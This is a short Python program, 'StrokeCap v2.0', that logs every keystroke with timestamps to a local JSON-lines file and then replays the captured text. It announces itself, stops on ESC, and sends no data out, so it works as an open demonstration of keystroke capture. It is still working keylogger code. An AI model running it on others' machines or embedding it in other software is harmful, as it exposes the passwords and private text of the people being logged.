from pynput import keyboard
from datetime import datetime
import platform
import json

print("StrokeCap v2.0 is active and logging. Press ESC to stop.")

os_name = platform.system()
platform_info = f"StrokeCap v2.0 logging started on: {os_name}"
with open("stroke_cap_log.txt", "a") as f:
    f.write(platform_info + "\n")
print(platform_info)

def format_key(key):
    if isinstance(key, keyboard.Key):
        return f"[{key.name.upper()}]"
    try:
        return f"'{key.char}'"
    except AttributeError:
        return f"[UNKNOWN:{key}]"

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    formatted_key = format_key(key)
    log_entry = {
        "event_type": "PRESS",
        "timestamp": timestamp,
        "key": formatted_key
    }
    with open("stroke_cap_log.txt", "a") as f:
        f.write(json.dumps(log_entry) + "\n")

def on_release(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    formatted_key = format_key(key)
    log_entry = {
        "event_type": "RELEASE",
        "timestamp": timestamp,
        "key": formatted_key
    }
    with open("stroke_cap_log.txt", "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

print("StrokeCap v2.0 has stopped logging.")

# --- JSON Parsing and Display ---
print("\n--- Parsed Keystrokes ---")
try:
    with open("stroke_cap_log.txt", "r") as f:
        for line in f:
            line = line.strip()
            if line.startswith("{"):  # Check if the line starts with a JSON object
                try:
                    log_entry = json.loads(line)
                    if log_entry["event_type"] == "PRESS":
                        key_value = log_entry["key"]
                        if key_value.startswith("'") and key_value.endswith("'") and len(key_value) == 3:
                            print(key_value[1], end="")
                        elif key_value == "[SPACE]":
                            print(" ", end="")
                        elif key_value == "[ENTER]":
                            print("[ENTER]")
                        elif key_value == "[TAB]":
                            print("[TAB]")
                        elif key_value.startswith("[") and key_value.endswith("]"):
                            pass # Ignore other special keys for this basic output
                except json.JSONDecodeError:
                    print(f"Error decoding JSON: {line}")
            else:
                print(f"Ignoring non-JSON line: {line}") # Optionally print non-JSON lines
except FileNotFoundError:
    print("Error: stroke_cap_log.txt not found.")
